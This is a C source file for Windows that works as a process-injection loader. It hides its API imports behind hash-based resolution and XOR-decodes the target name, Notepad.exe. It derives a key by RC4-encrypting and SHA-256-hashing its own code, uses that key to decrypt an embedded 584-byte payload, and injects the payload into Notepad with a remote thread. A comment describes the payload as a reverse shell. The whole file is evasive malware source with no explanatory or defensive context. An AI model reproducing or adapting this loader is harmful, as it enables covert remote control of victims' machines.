#include "something.h"
#include "sha256.h"

// typedef int(__stdcall* msgbox)(HWND, LPCSTR, LPCSTR, UINT);
typedef BOOL(__stdcall* enumProcessesCustom)(DWORD *, DWORD, LPDWORD);
typedef HANDLE(__stdcall* openProcessCustom)(DWORD, BOOL, DWORD);
typedef BOOL(__stdcall* enumProcessModulesCustom)(HANDLE, HMODULE *, DWORD, LPDWORD);
typedef DWORD(__stdcall* getModuleBaseNameACustom)(HANDLE, HMODULE, LPSTR, DWORD);
typedef BOOL(__stdcall* closeHandleCustom)(HANDLE);
typedef LPVOID(__stdcall* virtualAllocExCustom)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(__stdcall* writeProcessMemoryCustom)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE(__stdcall* createRemoteThreadCustom)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

api_table x[] = {
    {0x1258a7ad, "User32.dll"},     //0
    {0x640e83ed, "Psapi.dll"},     //1, enumprocesses
    {0xae54b59, "Kernel32.dll"},     //2, openprocess
    {0x382269b1, "Psapi.dll"},     //3, enumprocessmodules
    {0x1871ba03, "Psapi.dll"},     //4, getmodulebasenamea
    {0x8ca784fd, "Kernel32.dll"},     //5, closehandle
    {0xf1b07be2, "Kernel32.dll"},     //6, virtualallocex
    {0x43fbc699, "Kernel32.dll"},     //7, writeprocessmemory
    {0x50d61646, "Kernel32.dll"}     //8, createremotethread
};

DWORD viewProcess() {
    DWORD processes[2000], recieve_byte;
    unsigned char key[] = {112, 119, 110, 101, 114, 105, 115, 99, 111, 111, 108};
    unsigned char t[] = {62, 56, 58, 32, 34, 40, 55, 77, 42, 55, 41};

    enumProcessesCustom enumProcesses = (enumProcessesCustom)api_resolver(&x[1]);
    if (!enumProcesses(processes, sizeof(processes), &recieve_byte)) {
        exit(1);
    }

    DWORD number_of_processes = recieve_byte / sizeof(DWORD);

    for (int i=0; i<number_of_processes; i++) {
        TCHAR szProcessName[MAX_PATH], pn[MAX_PATH], f[20];
        memset(f, 0, sizeof(f));
        memset(szProcessName, 0, sizeof(szProcessName));

        openProcessCustom openProcess = (openProcessCustom)api_resolver(&x[2]);
        HANDLE hProcess = openProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (NULL != hProcess )
        {
            HMODULE hMod;
            DWORD cbNeeded;
            enumProcessModulesCustom enumProcessModules = (enumProcessModulesCustom)api_resolver(&x[3]);
            if (enumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded) )
            {
                getModuleBaseNameACustom getModuleBaseNameA = (getModuleBaseNameACustom)api_resolver(&x[4]);
                getModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName));
            }
        }

        for (int i=0; i<strlen(szProcessName); i++)
            pn[i] = toupper(szProcessName[i]);

        for (int i=0; i<11; i++)
            f[i] = (char)(key[i] ^ t[i]);
        
        if (!strcmp(pn, f))
            return processes[i];
        memset(pn, 0, sizeof(pn));

        // printf("%s (PID = %d)\n", szProcessName, processes[i]);
        closeHandleCustom closeHandle = (closeHandleCustom)api_resolver(&x[5]);
        closeHandle(hProcess);
    }

    return 0;
}

DWORD findSize(BYTE* x) {
    int i = 0;
    while (x[i] != 0xc3) i++;
    return i + 1;
}

void swapCustom(DWORD* x1, DWORD* x2) {
    DWORD u = *x1;
    *x1 = *x2;
    *x2 = u;
}

int main(int argc, char *argv[]) {
    if (argc != 2) exit(1);

    BYTE buf[] = "\xe9\xb2\x91\xe9\xca\x4e\x9e\x8e\xed\x4e\x3e\xb1\x16\x74\xec\xf7\x1a\xa0\x39\x72\x10\x72\x87\x92\x40\x2e\xa1\x8b\xd8\x38\x08\xc1\x8c\x7b\xa7\x5e\xb4\x45\xd6\x55\x89\xac\x41\xbb\x6d\x52\x80\xd0\x36\x37\x00\x9c\x05\xb7\x96\x6b\x4d\x88\x33\xd1\x37\xe2\xee\x31\x3a\x96\xd9\xce\x95\x25\xe3\x89\x89\xa4\xd7\x1b\xcd\x9d\x37\x9a\x7c\x3b\x60\x14\x1d\xd4\x07\x91\x39\xd8\x9d\xb6\x53\x49\xfd\x90\xbb\x10\xca\xd7\x1c\x4c\x5c\xfb\x80\x7e\xed\xc0\xd7\xb2\x0b\x92\x0a\x3e\x50\x0d\xde\x65\x4f\x3d\x05\xb9\xa9\x31\xbf\x1d\xdb\x19\x73\xcd\xdb\x5d\x95\xb6\xf5\x22\x81\x0f\xec\x4a\x55\x71\xd6\x98\xc9\xbf\x10\x56\x61\x6d\x8f\x3c\xd3\xf4\xd0\x7d\x37\x58\x7c\xfd\x33\xdc\x42\xdb\x9c\xaf\x70\x91\x21\x5a\x54\x07\x86\xde\xa4\xd8\x73\x4f\x80\xa8\x8d\xbd\x83\xb6\x45\x9d\xa8\xb5\xaf\x0f\xfd\xda\x7e\x55\xcf\x5d\x9d\xb2\xf8\xa8\x11\x6e\x2e\x4f\x0d\xda\x81\x00\x77\x2e\x10\x85\x0b\xbc\x9d\x7c\x5d\xf8\xb8\xf5\x25\x21\x3f\xbd\x52\x5c\xd9\x29\x3d\xf6\xf0\xf0\x9b\x67\x2e\x59\x6c\xc5\x7f\x2f\xc9\x2b\x18\x63\x22\x96\xf5\x62\x36\x8b\xe1\xb4\x3e\x3f\xf5\xd8\x94\x55\x0a\x3a\x7d\xaf\xb1\xa9\x88\xa6\x40\x02\x39\x90\x80\xd4\xe4\xb6\xf9\x4c\xd0\xa4\x93\x74\x8c\x5d\xad\x3d\x8e\x28\x06\x1d\x05\x3b\x8c\x29\x08\xe2\x38\x43\xa9\x2e\xa4\x4b\x85\xcb\xc1\x6a\x1f\xf6\x3a\xdd\xaa\x30\x97\x6d\x48\x88\x28\xf9\x4e\xa9\xf4\xae\xb2\x55\x02\x14\x95\x51\x71\xe1\x48\xee\xe4\xf1\x6f\x9d\x5f\x30\xc9\xa3\x19\x54\x92\x8f\xd7\x7c\x5d\xf5\x68\x56\x37\xe0\x45\x10\xc8\x84\x2e\xa2\xbc\x51\x64\xe1\x40\xeb\xe5\x49\x85\x92\xc9\x68\x55\x1b\x35\xdd\x55\xe5\xc7\x3d\x44\xe9\xa0\xe4\x37\xe0\x5e\x06\x25\x4a\xc6\xe7\x1d\xc4\xbc\xf0\x80\x7f\x47\xb7\xe3\x55\xc4\xf4\x62\x77\x50\x95\xd8\xa1\xe3\x25\xc3\xb9\x89\xfc\xf6\x8f\xea\x01\x33\x4d\xca\x86\x9c\xfe\xf8\x56\x01\x6e\xf5\x02\x7a\x5a\xcd\x59\xf7\x3a\xd8\x1c\x14\x5f\xbe\xf1\x3a\x3f\x1e\x61\x37\x58\x6e\x19\x8d\xd7\x00\xd8\x9c\x14\xb9\x2e\xdc\x4f\x5a\x9e\x3e\x62\x35\x72\x60\x37\xeb\x7b\xc0\x58\x5a\xc2\xd0\xf1\x62\x70\x57\x55\xba\x2d\x78\x9d\x70\x36\xa8\xab\x0a\xee\xd2\x5d\xca\x21\x85\xcb\xc1\x59\xec\x89\x84\x95\xed\xd6\xf4\x1c\x24\x98\xc0\x95\x02\x39\xf4\xe9\x41\x2e\xb8\xe5\xee\x9d\x82\x9a\x91\x67\x1d\x78\xb6\xa1\xb3\xe3\x05\x45\x62\x8d\x1d\x5d\x98\x50\x36\x89\x96\x80\x0d\x5a\xec\x19\xca\x2e\xba\xe7\x82\x9f\xdf\xf6\xf5\x7f\xed\xf3\xe0\xe9\xf2\xe3\x60\x29\x64\xb5\x05\xad\x7f\x6a\x64\xd7\x8f\xd5\x51\x26\xd2\x01\x72\x1d\x8b\xd6\xdd\xae\xb1\x71";

    BYTE* funcByte = &main;
    int sizeFuncByte = findSize(funcByte);
    BYTE* ans = malloc(sizeFuncByte);

    DWORD s[260];
    ZeroMemory(s, sizeof(s));

    // Enumerate Process to find Notepad.exe
    DWORD processid;
    while (processid = viewProcess(), !processid) {}

    // RC4 implementation
    for (int i=0; i<256; i++) {
        s[i] = i;
    }

    DWORD u1 = 0;
    for (int i=0; i<256; i++) {
        u1 = (u1 + s[i] + (BYTE)argv[1][i % strlen(argv[1])]) & 0xff;
        swapCustom(&s[i], &s[u1]);
    }

    DWORD x1 = 0, x2 = 0;
    for (int i=0; i<sizeFuncByte; i++) {
        x1 = (x1 + 1) & 0xff;
        x2 = (x2 + s[x1]) & 0xff;
        swapCustom(&s[x1], &s[x2]);
        ans[i] = (s[ (s[x1] + s[x2]) & 0xff ] ^ funcByte[i]);
    }

    // for (int i=0; i<sizeFuncByte; i++)
    //     printf("%02x ", funcByte[i]);
    // putchar(10);
    // putchar(10);
    
    // Sha256 hash resulted RC4 answer
    SHA256_CTX block;
    BYTE hashChecksum[SHA256_BLOCK_SIZE];

    sha256_init(&block);
    sha256_update(&block, ans, sizeFuncByte);
    sha256_final(&block, hashChecksum);

    // for (int i=0; i<SHA256_BLOCK_SIZE; i++)
    //     printf("0x%02x, ", hashChecksum[i]);
    // putchar(10);
    // putchar(10);

    // Modify shellcode
    for (int i=0; i<584; i++)
        buf[i] ^= hashChecksum[i % SHA256_BLOCK_SIZE];

    // for (int i=0; i<584; i++)
    //     printf("%02x, ", buf[i]);
    // putchar(10);
    // putchar(10);

    // Inject Reverse Shell to Notepad.exe
    openProcessCustom openProcess = (openProcessCustom)api_resolver(&x[2]);
    HANDLE hdp = openProcess(PROCESS_ALL_ACCESS, FALSE, processid);

    virtualAllocExCustom virtualAllocEx = (virtualAllocExCustom)api_resolver(&x[6]);
    LPVOID addr = virtualAllocEx(hdp, 0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    writeProcessMemoryCustom writeProcessMemory = (writeProcessMemoryCustom)api_resolver(&x[7]);
    writeProcessMemory(hdp, addr, buf, sizeof(buf), NULL);

    createRemoteThreadCustom createRemoteThread = (createRemoteThreadCustom)api_resolver(&x[8]);
    HANDLE stat = createRemoteThread(hdp, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

    closeHandleCustom closeHandle = (closeHandleCustom)api_resolver(&x[5]);
    closeHandle(hdp);
    return 0;
}